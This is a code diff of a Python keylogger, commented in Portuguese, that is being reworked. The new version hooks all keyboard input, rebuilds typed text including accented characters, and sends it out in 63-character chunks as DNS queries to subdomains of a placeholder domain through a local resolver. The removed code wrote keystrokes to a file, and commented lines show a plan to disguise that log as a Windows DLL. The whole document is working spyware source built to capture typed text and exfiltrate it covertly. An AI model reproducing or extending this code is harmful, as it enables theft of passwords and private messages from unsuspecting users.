@@ -3,90 +3,26 @@
 ###############################################################
 import os
 import time
+import idna
 import socket
 import threading
-import pynput.keyboard
+import keyboard
 from dnslib import DNSRecord, RR, A
 
 ###############################################################
 # Vars. Global
 ###############################################################
-# Ofuscação no Windows
+# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
 # _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
 # _NAME = 'licence.dll'
 _DNS_ADDR = ('127.0.0.1', 9953)
-_PATH = None
+_FAKE_DOMAIN = '.example.com'
 _KEYS = ''
-_AUTO_SAVE_TIME = 10
-_RUN = True
-_NUMBERS = {
-    "96":"0",
-    "97":"1",
-    "98":"2",
-    "99":"3",
-    "100":"4",
-    "101":"5",
-    "102":"6",
-    "103":"7",
-    "104":"8",
-    "105":"9"
-}
+_LAST_KEY = None
 
 ###############################################################
 # Classes e Funções
 ###############################################################
-def auto_save():
-    """
-    Salva automaticamente o que o usuário digitou
-    dentro do tempo especificado em _AUTO_SAVE_TIME.
-
-    Parameters:
-        None
-
-    Returns:
-        None
-    """
-    global _KEYS
-    global _AUTO_SAVE_TIME
-    global _RUN
-
-    while _RUN:
-        if _PATH:
-            if len(_KEYS) > 0:
-                write_on_file(_KEYS)
-        else:
-            # Chamar a função para enviar via DNS
-            pass
-        
-        time.sleep(_AUTO_SAVE_TIME)
-
-def write_on_file(c):
-    """
-    Grava o conteudo passado para ela em um arquivo
-    especificado em _PATH.
-
-    Parameters:
-        c (str): Conteudo que será gravado no arquivo.
-
-    Returns:
-        None
-    """
-    global _PATH
-    global _KEYS
-    c = str(c)
-    with open(_PATH, 'a+') as file:
-        file.write(c)
-        file.close()
-    _KEYS = '' # Zerando a var global para reutilizar !
-
-'''
-def del_on_file():
-    with open(path, 'r+') as file:
-        content = file.read()
-        file.write(content[:-1])
-        file.close()
-'''
-
 def send_data(data):
     '''
     Recebe os dados e os envia usando requisições DNS
@@ -98,117 +34,96 @@ def send_data(data):
     Returns:
         None    
     '''
-    global _DNS_ADDR
+    global _DNS_ADDR, _FAKE_DOMAIN
 
     # Divide os dados em partes menores para serem válidos
-    # como nomes de domínio máximo de 63bytes por hostname
-    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)]
-    
+    # como nomes de domínio máximo de 63bytes por hostname.
+    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
+    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 
+
     while len(parts) > 0:
-        # Cria um nome de domínio fictício
-        domain = parts.pop(0) + '.example.com'
+        # Cria o payload com o nome de domínio fictício
+        part = parts.pop(0)
+        part = idna.encode(part).encode('ascii')
+        request = str(part) + str(_FAKE_DOMAIN)
         
         # Cria a requisição DNS
-        q = DNSRecord.question(domain)
-        
+        domain = DNSRecord.question(request)
+
         # Envia a requisição DNS para o servidor
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(5.0)
-        sock.sendto(q.pack(), _DNS_ADDR)
 
-        # Recebendo resposta falsa do DNS
         try:
+            sock.sendto(domain.pack(), ('127.0.0.1', 9953))
+        except:
+            print('Erro ao enviar!')
+
+        try:
+            # Recebendo resposta falsa do DNS
             _ = sock.recvfrom(512)
         except socket.timeout:
             print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
+            pass
             
+        # Não sei se precisa disso...
         sock.close()
 
-def p_numbers(n):
-    """
-    Recebe o número no formato do Pynput
-    e o transforma em decimal.
+def on_key_event(e):
+    global _KEYS, _LAST_KEY
+    
+    # Só envio quando bater o tamanho máximo de envio por DNS
+    if len(_KEYS) >= 63:
+        send_data(_KEYS)
+        _KEYS = ''
+    
+    # Se eu pressionei a tecla ele pega qual foi
+    if e.event_type == keyboard.KEY_DOWN:
+        key = e.name
+        
+        # Se for uma teclas especiais
+        if key == 'space':
+            _KEYS += ' '
 
-    Parameters:
-        n (int): Recebe o número em binário
-        e o converte para decimal
+        elif key == 'backspace':
+            _KEYS = _KEYS[:-1]
 
-    Returns:
-         Retorna o Valor convertido para decimal
-    """
-    global _NUMBERS
+        elif key == 'enter':
+            _KEYS += '\n'
 
-    for key, value in _NUMBERS.items():
-        if n == int(key):
-            return value
+        elif key in ['´', '`', '^', '~', 'ç']:
+            _LAST_KEY = key
 
-def on_press(key):
-    global _KEYS
-    global _RUN
+        elif key == 'shift':
+            pass
 
-    # Encerra o programa
-    if key == keyboard.Key.esc:
-        _RUN = False
-        return False
-
-    # Se apertar enter ele grava/envia o que está digitado
-    elif key == keyboard.Key.enter:
-        _KEYS += ' \n'
-        if _PATH:
-            write_on_file(_KEYS)
         else:
-            send_data(_KEYS)
-            _KEYS = ''
+            # Pesquisei e nenhuma biblioteca trata direito as acentos...
+            # Esse "Workaround" funciona...
+            if _LAST_KEY:
+                if _LAST_KEY == '´' and key == 'e':
+                    _KEYS += 'é'
+                elif _LAST_KEY == '`' and key == 'a':
+                    _KEYS += 'à'
+                elif _LAST_KEY == '^' and key == 'a':
+                    _KEYS += 'â'
+                elif _LAST_KEY == '~' and key == 'a':
+                    _KEYS += 'ã'
+                elif _LAST_KEY == '´' and key == 'c':
+                    _KEYS += 'ç'
+                else:
+                    _KEYS += _LAST_KEY + key
 
-    # Adicionando espaço do TAB
-    elif key == keyboard.Key.tab:
-        _KEYS += '	'
-
-    # Se Apertar o Espaço ele o adiciona
-    elif key == keyboard.Key.space:
-        _KEYS += ' '
-
-    # Ainda preciso fazer a parte de deletar
-    elif key == keyboard.Key.backspace:
-        pass
-
-    # Se for qualquer outra tecla especial eu descarto ela !
-    elif isinstance(key, keyboard.Key):
-        pass
-
-    # Se não for nenhuma das teclas selecionadas
-    else:
-        # Verifico se é letras
-        if key.char:
-            print('é char')
-            _KEYS += str(key).replace("'", "")
-
-        # Verifico se é numeros
-        else:
-            print('é numero')
-            key = int(str(key).replace('<', '').replace('>', ''))
-            _KEYS += str(p_numbers(key))
+                _LAST_KEY = None
+            else:
+                _KEYS += key
+    
+    # Apenasas verificando, remover esse print mais tarde
+    print(_KEYS)
 
 ###############################################################
 # Main
 ###############################################################
 if __name__ == "__main__":
-    # Verifica se o caminho para gravar existe
-    '''
-    if os.path.isdir(_PATH):
-        _PATH = os.path.join(_PATH, _NAME)
-    else:
-        os.mkdir(_PATH)
-        _PATH = os.path.join(_PATH, _NAME)
-    '''
-
-    # Cria um listener para capturar os eventos de teclado
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    th = [threading.Thread(target=auto_save()), threading.Thread(target=listener.join())]
-
-    for i in range(0, len(th)):
-        th[i].start()
-
-    for i in range(0, len(th)):
-        th[i].join()
+    keyboard.hook(on_key_event)
+    keyboard.wait('esc') # Mudar para nada futuramente
